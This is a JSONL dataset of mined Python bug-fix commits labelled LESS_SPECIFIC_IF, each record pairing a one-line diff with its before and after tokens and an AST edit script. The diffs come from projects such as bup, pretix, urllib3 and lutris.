{"project": "toaster-next", "commit_sha": "157947efc7e505e01baafb33ec93fe2f485308fe", "parent_sha": "71c837611690ab4bec1656a58d13ca48e7c6a6e6", "file_path": "bitbake/lib/bb/build.py", "project_url": "https://github.com/toastertester/toaster-next", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -723,7 +723,7 @@ def make_stamp(task, d, file_name = None):\n     for mask in cleanmask:\n         for name in glob.glob(mask):\n             # Preserve sigdata files in the stamps directory\n-            if \"sigdata\" in name:\n+            if \"sigdata\" in name or \"sigbasedata\" in name:\n                 continue\n             # Preserve taint files in the stamps directory\n             if name.endswith('.taint'):\n", "before": "if \"sigdata\" in name : continue", "after": "if \"sigdata\" in name or \"sigbasedata\" in name : continue", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 13, 4, 25], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 16, 3, 33], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"string:\\\"sigbasedata\\\"\", \"T\"], 0], [\"Insert\", \"N1\", [\"in:in\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:name\", \"T\"], 2]]"}
{"project": "TwitchNotifier", "commit_sha": "204906dcc0bbcd9ebad42c68ea596981a5fa5de8", "parent_sha": "f4c2a450e88a75a9f9139eb56db53c459b78eda5", "file_path": "library.py", "project_url": "https://github.com/GiedriusS/TwitchNotifier", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -118,7 +118,7 @@ class NotifyApi(object):\n                       str(r.status_code), '\\nr.headers: ' + str(r.headers))\n             return None\n \n-        if 'stream' in json and json['stream'] is None:\n+        if ('stream' in json and json['stream'] is None) or 'error' in json:\n             return False\n         else:\n             return True\n", "before": "if 'stream' in json and json [ 'stream' ] is None : return False else : return True", "after": "if ( 'stream' in json and json [ 'stream' ] is None ) or 'error' in json : return False else : return True", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 12, 3, 55], [\"parenthesized_expression\", \"N0\"], 0], [\"Insert\", [\"boolean_operator\", 3, 12, 3, 55], [\"or:or\", \"T\"], 1], [\"Insert\", [\"boolean_operator\", 3, 12, 3, 55], [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N0\", [\"(:(\", \"T\"], 0], [\"Move\", \"N0\", [\"boolean_operator\", 3, 12, 3, 55], 1], [\"Insert\", \"N0\", [\"):)\", \"T\"], 2], [\"Insert\", \"N1\", [\"string:'error'\", \"T\"], 0], [\"Insert\", \"N1\", [\"in:in\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:json\", \"T\"], 2]]"}
{"project": "sovrin-node", "commit_sha": "0c210ae57eec4e9db54d337330af21c23af5477c", "parent_sha": "ddcbe53c6445b71f7a81378f65d2c05087889c89", "file_path": "indy_client/agent/run_agent.py", "project_url": "https://github.com/spivachuk/sovrin-node", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -64,7 +64,7 @@ def runAgent(agent, looper=None, bootstrap=None):\n \n     def is_connected(agent):\n         client = agent.client\n-        if not client.can_send_write_requests():\n+        if (client.mode is None) or (not client.can_send_write_requests()):\n             raise NotConnectedToNetwork(\"Client hasn't finished catch-up with Pool Ledger yet or \"\n                                         \"doesn't have sufficient number of connections\")\n \n", "before": "if not client . can_send_write_requests ( ) : raise NotConnectedToNetwork ( \"Client hasn't finished catch-up with Pool Ledger yet or \" \"doesn't have sufficient number of connections\" )", "after": "if ( client . mode is None ) or ( not client . can_send_write_requests ( ) ) : raise NotConnectedToNetwork ( \"Client hasn't finished catch-up with Pool Ledger yet or \" \"doesn't have sufficient number of connections\" )", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 5, 89], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"parenthesized_expression\", \"N1\"], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"parenthesized_expression\", \"N2\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"comparison_operator\", \"N3\"], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Move\", \"N2\", [\"not_operator\", 3, 12, 3, 48], 1], [\"Insert\", \"N2\", [\"):)\", \"T\"], 2], [\"Insert\", \"N3\", [\"attribute\", \"N4\"], 0], [\"Insert\", \"N3\", [\"is:is\", \"T\"], 1], [\"Insert\", \"N3\", [\"none:None\", \"T\"], 2], [\"Insert\", \"N4\", [\"identifier:client\", \"T\"], 0], [\"Insert\", \"N4\", [\".:.\", \"T\"], 1], [\"Insert\", \"N4\", [\"identifier:mode\", \"T\"], 2]]"}
{"project": "natuurpunt-base", "commit_sha": "4a2e593cd31e055410597cdca7071ee60b53a095", "parent_sha": "d98a9466a5b1a50fcd27a6d5e0e59ae971f71a78", "file_path": "natuurpunt_contacten/natuurpunt_contacten.py", "project_url": "https://github.com/smart-solution/natuurpunt-base", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -77,7 +77,7 @@ class res_partner(osv.osv):\n         if view_type == 'form' and uid in protect_contact:\r\n             #disable stamdata\r\n             view = self.pool.get('ir.ui.view').browse(cr,uid,view_id)\r\n-            if view.id and view.name != u'organisation.partner.form':\r\n+            if view.id and view.name != u'organisation.partner.form' or not view.id:\r\n                 #disable create button\r\n                 [node.set('create', '0') for node in doc.xpath(\"/form\")]\r\n                 [node.set('delete', '0') for node in doc.xpath(\"/form\")]\r\n", "before": "if view . id and view . name != u'organisation.partner.form' : [ node . set ( 'create' , '0' ) for node in doc . xpath ( \"/form\" ) ] [ node . set ( 'delete' , '0' ) for node in doc . xpath ( \"/form\" ) ]", "after": "if view . id and view . name != u'organisation.partner.form' or not view . id : [ node . set ( 'create' , '0' ) for node in doc . xpath ( \"/form\" ) ] [ node . set ( 'delete' , '0' ) for node in doc . xpath ( \"/form\" ) ]", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Move\", [\"boolean_operator\", 3, 16, 3, 69], [\"boolean_operator\", 3, 16, 3, 69], 0], [\"Insert\", [\"boolean_operator\", 3, 16, 3, 69], [\"or:or\", \"T\"], 1], [\"Insert\", [\"boolean_operator\", 3, 16, 3, 69], [\"not_operator\", \"N0\"], 2], [\"Insert\", \"N0\", [\"not:not\", \"T\"], 0], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 1], [\"Insert\", \"N1\", [\"identifier:view\", \"T\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:id\", \"T\"], 2]]"}
{"project": "bup", "commit_sha": "58ac9968f5a00de0741ed03111a923ef54646f12", "parent_sha": "077e0daec79d9891886d64351930b11e85a58e3b", "file_path": "lib/bup/metadata.py", "project_url": "https://github.com/saraedum/bup", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -562,7 +562,7 @@ class Metadata:\n             try:\n                 set_linux_file_attr(path, self.linux_attr)\n             except OSError, e:\n-                if e.errno == errno.ENOTTY:\n+                if e.errno == errno.ENOTTY or e.errno == errno.EOPNOTSUPP:\n                     raise ApplyError('Linux chattr: %s' % e)\n                 else:\n                     raise\n", "before": "if e . errno == errno . ENOTTY : raise ApplyError ( 'Linux chattr: %s' % e ) else : raise", "after": "if e . errno == errno . ENOTTY or e . errno == errno . EOPNOTSUPP : raise ApplyError ( 'Linux chattr: %s' % e ) else : raise", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 17, 6, 26], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 20, 3, 43], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 0], [\"Insert\", \"N1\", [\"==:==\", \"T\"], 1], [\"Insert\", \"N1\", [\"attribute\", \"N3\"], 2], [\"Insert\", \"N2\", [\"identifier:e\", \"T\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:errno\", \"T\"], 2], [\"Insert\", \"N3\", [\"identifier:errno\", \"T\"], 0], [\"Insert\", \"N3\", [\".:.\", \"T\"], 1], [\"Insert\", \"N3\", [\"identifier:EOPNOTSUPP\", \"T\"], 2]]"}
{"project": "bup", "commit_sha": "9a35d447aded4f7d27da1c98181a19c08d29d0d8", "parent_sha": "72516d9b2dfa4c98fa14ef8906e3e3353abb03ad", "file_path": "lib/bup/t/tmetadata.py", "project_url": "https://github.com/saraedum/bup", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -244,7 +244,7 @@ from bup.metadata import xattr\n if xattr:\n     @wvtest\n     def test_handling_of_incorrect_existing_linux_xattrs():\n-        if not is_superuser():\n+        if not is_superuser() or detect_fakeroot():\n             WVMSG('skipping test -- not superuser')\n             return\n         setup_testfs()\n", "before": "if not is_superuser ( ) : WVMSG ( 'skipping test -- not superuser' ) return", "after": "if not is_superuser ( ) or detect_fakeroot ( ) : WVMSG ( 'skipping test -- not superuser' ) return", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"not_operator\", 3, 12, 3, 30], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"call\", 3, 16, 3, 30], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"call\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:detect_fakeroot\", \"T\"], 0], [\"Insert\", \"N1\", [\"argument_list\", \"N2\"], 1], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"):)\", \"T\"], 1]]"}
{"project": "pretix", "commit_sha": "2e9e8eabb1077e6a95dbf32dc975f4ecfc292669", "parent_sha": "0fc102615f306bcf04f75efd17c4769e39db5aed", "file_path": "src/pretix/base/models/event.py", "project_url": "https://github.com/maniacs-satm/pretix", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -143,7 +143,7 @@ class Event(LoggedModel):\n         tz = tz or pytz.timezone(self.settings.timezone)\n-        if not self.settings.show_date_to:\n+        if not self.settings.show_date_to or not self.date_to:\n             return \"\"\n         return _date(\n             self.date_to.astimezone(tz),\n", "before": "if not self . settings . show_date_to : return \"\"", "after": "if not self . settings . show_date_to or not self . date_to : return \"\"", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"not_operator\", 1, 12, 1, 42], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"attribute\", 1, 16, 1, 42], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"not_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"not:not\", \"T\"], 0], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 1], [\"Insert\", \"N2\", [\"identifier:self\", \"T\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:date_to\", \"T\"], 2]]"}
{"project": "bup", "commit_sha": "556244516a31717af7865af2a2af0ab06b6efdec", "parent_sha": "15d7c4f60b51f9774b1f8e7fda561134b367ce6b", "file_path": "lib/bup/helpers.py", "project_url": "https://github.com/saraedum/bup", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -754,7 +754,7 @@ if _mincore:\n             try:\n                 m = mmap.mmap(fd, msize, mmap.MAP_PRIVATE, 0, 0, pos)\n             except mmap.error, ex:\n-                if ex.errno == errno.ENODEV:\n+                if ex.errno == errno.EINVAL or ex.errno == errno.ENODEV:\n                     # Perhaps the file was a pipe, i.e. \"... | bup split ...\"\n                     return None\n                 raise ex\n", "before": "if ex . errno == errno . ENODEV : return None", "after": "if ex . errno == errno . EINVAL or ex . errno == errno . ENODEV : return None", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 17, 5, 32], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 20, 3, 44], 2], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 0], [\"Insert\", \"N1\", [\"==:==\", \"T\"], 1], [\"Insert\", \"N1\", [\"attribute\", \"N3\"], 2], [\"Insert\", \"N2\", [\"identifier:ex\", \"T\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:errno\", \"T\"], 2], [\"Insert\", \"N3\", [\"identifier:errno\", \"T\"], 0], [\"Insert\", \"N3\", [\".:.\", \"T\"], 1], [\"Insert\", \"N3\", [\"identifier:EINVAL\", \"T\"], 2]]"}
{"project": "pretix", "commit_sha": "825b985f81b83ac8078c02808dee585b7c2099da", "parent_sha": "99604036c28c69c5cb4974a1b625de040a96347e", "file_path": "src/pretix/base/forms/__init__.py", "project_url": "https://github.com/maniacs-satm/pretix", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -130,7 +130,7 @@ class SettingsForm(forms.Form):\n                     except OSError:\n                         logger.error('Deleting file %s failed.' % fname.name)\n \n-            if value is None:\n+            if value is None or value is False:\n                 del self.obj.settings[name]\n             elif self.obj.settings.get(name, as_type=type(value)) != value:\n                 self.obj.settings.set(name, value)\n", "before": "if value is None : del self . obj . settings [ name ] elif self . obj . settings . get ( name , as_type = type ( value ) ) != value : self . obj . settings . set ( name , value )", "after": "if value is None or value is False : del self . obj . settings [ name ] elif self . obj . settings . get ( name , as_type = type ( value ) ) != value : self . obj . settings . set ( name , value )", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 13, 6, 51], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 16, 3, 29], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:value\", \"T\"], 0], [\"Insert\", \"N1\", [\"is:is\", \"T\"], 1], [\"Insert\", \"N1\", [\"false:False\", \"T\"], 2]]"}
{"project": "txHttpUtil", "commit_sha": "56b22decc4e7182529ecffb07bfe2dffde3cc3ee", "parent_sha": "f143c813c8bfeb0b9418c6967aa57886b317d95f", "file_path": "txhttputil/site/BasicResource.py", "project_url": "https://github.com/Synerty/txHttpUtil", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -92,7 +92,7 @@ class BasicResource:\n             request.prepath.append(path)\n \n         # Look back through the file resources and see if there are any matches\n-        if isinstance(resource, NoResource):\n+        if isinstance(resource, NoResource) or isinstance(resource, FileUnderlayResource):\n             while fileUnderlayResourceStack:\n                 resource, postPath = fileUnderlayResourceStack.pop()\n                 fileResource = resource.getFileResource(postPath)\n", "before": "if isinstance ( resource , NoResource ) : while fileUnderlayResourceStack : resource , postPath = fileUnderlayResourceStack . pop ( ) fileResource = resource . getFileResource ( postPath )", "after": "if isinstance ( resource , NoResource ) or isinstance ( resource , FileUnderlayResource ) : while fileUnderlayResourceStack : resource , postPath = fileUnderlayResourceStack . pop ( ) fileResource = resource . getFileResource ( postPath )", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 6, 66], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"call\", 3, 12, 3, 44], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"call\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:isinstance\", \"T\"], 0], [\"Insert\", \"N1\", [\"argument_list\", \"N2\"], 1], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"identifier:resource\", \"T\"], 1], [\"Insert\", \"N2\", [\",:,\", \"T\"], 2], [\"Insert\", \"N2\", [\"identifier:FileUnderlayResource\", \"T\"], 3], [\"Insert\", \"N2\", [\"):)\", \"T\"], 4]]"}
{"project": "ansible-modules-core", "commit_sha": "a34dae58cf488a46c7800a39aad3b236f94128ae", "parent_sha": "a98cd86f8853c1e1a1441d0b61a71204bdd67702", "file_path": "cloud/amazon/ec2_elb_lb.py", "project_url": "https://github.com/jpic/ansible-modules-core", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -888,7 +888,7 @@ class ElbManager(object):\n     def _set_stickiness_policy(self, elb_info, listeners_dict, policy, **policy_attrs):\n         for p in getattr(elb_info.policies, policy_attrs['attr']):\n             if str(p.__dict__['policy_name']) == str(policy[0]):\n-                if str(p.__dict__[policy_attrs['dict_key']]) != str(policy_attrs['param_value']):\n+                if str(p.__dict__[policy_attrs['dict_key']]) != str(policy_attrs['param_value'] or 0):\n                     self._set_listener_policy(listeners_dict)\n                     self._update_policy(policy_attrs['param_value'], policy_attrs['method'], policy_attrs['attr'], policy[0])\n                     self.changed = True\n", "before": "if str ( p . __dict__ [ policy_attrs [ 'dict_key' ] ] ) != str ( policy_attrs [ 'param_value' ] ) : self . _set_listener_policy ( listeners_dict ) self . _update_policy ( policy_attrs [ 'param_value' ] , policy_attrs [ 'method' ] , policy_attrs [ 'attr' ] , policy [ 0 ] ) self . changed = True", "after": "if str ( p . __dict__ [ policy_attrs [ 'dict_key' ] ] ) != str ( policy_attrs [ 'param_value' ] or 0 ) : self . _set_listener_policy ( listeners_dict ) self . _update_policy ( policy_attrs [ 'param_value' ] , policy_attrs [ 'method' ] , policy_attrs [ 'attr' ] , policy [ 0 ] ) self . changed = True", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 68, 3, 97], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"subscript\", 3, 69, 3, 96], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"integer:0\", \"T\"], 2]]"}
{"project": "urllib3", "commit_sha": "b514c2063d3dba1442b3cdbd8fc0fcd1e5bf7b88", "parent_sha": "dd7a574b426fb6b704018a3d568f9ea7e17f4a6e", "file_path": "urllib3/poolmanager.py", "project_url": "https://github.com/ncoghlan/urllib3", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -152,7 +152,7 @@ class PoolManager(RequestMethods):\n \n         kw['assert_same_host'] = False\n         kw['redirect'] = False\n-        if 'headers' not in kw:\n+        if 'headers' not in kw or kw['headers'] == None:\n             kw['headers'] = self.headers\n \n         if self.proxy is not None and u.scheme == \"http\":\n", "before": "if 'headers' not in kw : kw [ 'headers' ] = self . headers", "after": "if 'headers' not in kw or kw [ 'headers' ] == None : kw [ 'headers' ] = self . headers", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 4, 41], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 12, 3, 31], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"subscript\", \"N2\"], 0], [\"Insert\", \"N1\", [\"==:==\", \"T\"], 1], [\"Insert\", \"N1\", [\"none:None\", \"T\"], 2], [\"Insert\", \"N2\", [\"identifier:kw\", \"T\"], 0], [\"Insert\", \"N2\", [\"[:[\", \"T\"], 1], [\"Insert\", \"N2\", [\"string:'headers'\", \"T\"], 2], [\"Insert\", \"N2\", [\"]:]\", \"T\"], 3]]"}
{"project": "rome", "commit_sha": "e8d7eb504bc46b867c7f5a19851128c0644f6a2f", "parent_sha": "6bc6273753ed7ec698df633c536b26971c40ea56", "file_path": "lib/rome/core/dataformat/converter.py", "project_url": "https://github.com/badock/rome", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -199,7 +199,7 @@ class JsonConverter(object):\n         if do_deep_simplification and not is_basic_type:\n \n             novabase_classname = str(obj.__class__.__name__)\n-            if novabase_classname == \"LazyReference\":\n+            if novabase_classname == \"LazyReference\" or novabase_classname == \"LazyValue\":\n                 novabase_classname = obj.resolve_model_name()\n             if isinstance(obj, dict) and \"novabase_classname\" in obj:\n                 novabase_classname = obj[\"novabase_classname\"]\n", "before": "if novabase_classname == \"LazyReference\" : novabase_classname = obj . resolve_model_name ( )", "after": "if novabase_classname == \"LazyReference\" or novabase_classname == \"LazyValue\" : novabase_classname = obj . resolve_model_name ( )", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 13, 4, 62], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 16, 3, 53], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:novabase_classname\", \"T\"], 0], [\"Insert\", \"N1\", [\"==:==\", \"T\"], 1], [\"Insert\", \"N1\", [\"string:\\\"LazyValue\\\"\", \"T\"], 2]]"}
{"project": "heimdall", "commit_sha": "5928e99633a00bb5b30201f75b880feeedcc4006", "parent_sha": "8fd0c54546b727fc4b58761ba7806744ef4013df", "file_path": "heimdall.py", "project_url": "https://github.com/PouncySilverkitten/heimdall", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -459,21 +459,21 @@ class Heimdall:\n \n         if comm[0] != \"!stats\":\n             return\n-        \n+\n         options = []\n         user = self.heimdall.packet.data.sender.name\n-        \n+ \n         if len(comm) > 1:\n             options = self.parse_options(comm[1:])\n             if len(comm) == 2 and comm[1].startswith(\"@\"):\n                 user = self.heimdall.normalise_nick(comm[1][1:])\n-            elif options == []:\n+            elif options == [] or ('@' in [s[0] for s in comm] and not comm[1].startswith(\"@\")):\n                 self.heimdall.reply(\"Sorry, I didn't understand that. Syntax is !stats (options) or !stats @user (options)\")\n                 return\n \n         if options == []:\n             options = ['messages', 'engagement', 'text']\n-        \n+ \n         normnick = self.heimdall.normalise_nick(user)\n \n         if 'aliases' in options:\n", "before": "if len ( comm ) == 2 and comm [ 1 ] . startswith ( \"@\" ) : user = self . heimdall . normalise_nick ( comm [ 1 ] [ 1 : ] ) elif options == [ ] : self . heimdall . reply ( \"Sorry, I didn't understand that. Syntax is !stats (options) or !stats @user (options)\" ) return", "after": "if len ( comm ) == 2 and comm [ 1 ] . startswith ( \"@\" ) : user = self . heimdall . normalise_nick ( comm [ 1 ] [ 1 : ] ) elif options == [ ] or ( '@' in [ s [ 0 ] for s in comm ] and not comm [ 1 ] . startswith ( \"@\" ) ) : self . heimdall . reply ( \"Sorry, I didn't understand that. Syntax is !stats (options) or !stats @user (options)\" ) return", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"elif_clause\", 11, 13, 13, 23], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 11, 18, 11, 31], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"parenthesized_expression\", \"N1\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"boolean_operator\", \"N2\"], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2], [\"Insert\", \"N2\", [\"comparison_operator\", \"N3\"], 0], [\"Insert\", \"N2\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N2\", [\"not_operator\", \"N4\"], 2], [\"Insert\", \"N3\", [\"string:'@'\", \"T\"], 0], [\"Insert\", \"N3\", [\"in:in\", \"T\"], 1], [\"Insert\", \"N3\", [\"list_comprehension\", \"N5\"], 2], [\"Insert\", \"N4\", [\"not:not\", \"T\"], 0], [\"Insert\", \"N4\", [\"call\", \"N6\"], 1], [\"Insert\", \"N5\", [\"[:[\", \"T\"], 0], [\"Insert\", \"N5\", [\"subscript\", \"N7\"], 1], [\"Insert\", \"N5\", [\"for_in_clause\", \"N8\"], 2], [\"Insert\", \"N5\", [\"]:]\", \"T\"], 3], [\"Insert\", \"N6\", [\"attribute\", \"N9\"], 0], [\"Insert\", \"N6\", [\"argument_list\", \"N10\"], 1], [\"Insert\", \"N7\", [\"identifier:s\", \"T\"], 0], [\"Insert\", \"N7\", [\"[:[\", \"T\"], 1], [\"Insert\", \"N7\", [\"integer:0\", \"T\"], 2], [\"Insert\", \"N7\", [\"]:]\", \"T\"], 3], [\"Insert\", \"N8\", [\"for:for\", \"T\"], 0], [\"Insert\", \"N8\", [\"identifier:s\", \"T\"], 1], [\"Insert\", \"N8\", [\"in:in\", \"T\"], 2], [\"Insert\", \"N8\", [\"identifier:comm\", \"T\"], 3], [\"Insert\", \"N9\", [\"subscript\", \"N11\"], 0], [\"Insert\", \"N9\", [\".:.\", \"T\"], 1], [\"Insert\", \"N9\", [\"identifier:startswith\", \"T\"], 2], [\"Insert\", \"N10\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N10\", [\"string:\\\"@\\\"\", \"T\"], 1], [\"Insert\", \"N10\", [\"):)\", \"T\"], 2], [\"Insert\", \"N11\", [\"identifier:comm\", \"T\"], 0], [\"Insert\", \"N11\", [\"[:[\", \"T\"], 1], [\"Insert\", \"N11\", [\"integer:1\", \"T\"], 2], [\"Insert\", \"N11\", [\"]:]\", \"T\"], 3]]"}
{"project": "client-python", "commit_sha": "ce91d3da20b9e6c614d02ca828d742ada4f575da", "parent_sha": "06656baa91958afd297f2bb935d370e059ab6ef4", "file_path": "pycti/opencti_stix2.py", "project_url": "https://github.com/OpenCTI-Platform/client-python", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1161,7 +1161,7 @@ class OpenCTIStix2:\n \n         start_time = time.time()\n         for item in stix_bundle['objects']:\n-            if item['type'] == 'identity' and (len(types) == 0 or 'identity' in types):\n+            if item['type'] == 'identity' and (len(types) == 0 or 'identity' in types or item['x_opencti_identity_type'] in types):\n                 self.import_object(item, update)\n         end_time = time.time()\n         logging.info(\"Identities imported in: %ssecs\" % round(end_time - start_time))\n", "before": "if item [ 'type' ] == 'identity' and ( len ( types ) == 0 or 'identity' in types ) : self . import_object ( item , update )", "after": "if item [ 'type' ] == 'identity' and ( len ( types ) == 0 or 'identity' in types or item [ 'x_opencti_identity_type' ] in types ) : self . import_object ( item , update )", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Move\", [\"boolean_operator\", 3, 48, 3, 86], [\"boolean_operator\", 3, 48, 3, 86], 0], [\"Insert\", [\"boolean_operator\", 3, 48, 3, 86], [\"or:or\", \"T\"], 1], [\"Insert\", [\"boolean_operator\", 3, 48, 3, 86], [\"comparison_operator\", \"N0\"], 2], [\"Insert\", \"N0\", [\"subscript\", \"N1\"], 0], [\"Insert\", \"N0\", [\"in:in\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:types\", \"T\"], 2], [\"Insert\", \"N1\", [\"identifier:item\", \"T\"], 0], [\"Insert\", \"N1\", [\"[:[\", \"T\"], 1], [\"Insert\", \"N1\", [\"string:'x_opencti_identity_type'\", \"T\"], 2], [\"Insert\", \"N1\", [\"]:]\", \"T\"], 3]]"}
{"project": "lutris", "commit_sha": "71c49cc6ed5883784d7ae14cdc6244f36622b41a", "parent_sha": "fa78f1aa09cee2e147b01978eb435aae3d277759", "file_path": "lutris/runners/libretro.py", "project_url": "https://github.com/MCOfficer/lutris", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -59,7 +59,7 @@ class libretro(Runner):\n     def is_installed(self, core=None):\n         if self.game_config.get('core') and core is None:\n             core = self.game_config['core']\n-        if not core:\n+        if not core or self.runner_config.get('runner_executable'):\n             return self.is_retroarch_installed()\n         is_core_installed = os.path.exists(self.get_core_path(core))\n         return self.is_retroarch_installed() and is_core_installed\n", "before": "if not core : return self . is_retroarch_installed ( )", "after": "if not core or self . runner_config . get ( 'runner_executable' ) : return self . is_retroarch_installed ( )", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"not_operator\", 3, 12, 3, 20], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"identifier:core\", 3, 16, 3, 20], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"call\", \"N1\"], 2], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 0], [\"Insert\", \"N1\", [\"argument_list\", \"N3\"], 1], [\"Insert\", \"N2\", [\"attribute\", \"N4\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:get\", \"T\"], 2], [\"Insert\", \"N3\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N3\", [\"string:'runner_executable'\", \"T\"], 1], [\"Insert\", \"N3\", [\"):)\", \"T\"], 2], [\"Insert\", \"N4\", [\"identifier:self\", \"T\"], 0], [\"Insert\", \"N4\", [\".:.\", \"T\"], 1], [\"Insert\", \"N4\", [\"identifier:runner_config\", \"T\"], 2]]"}
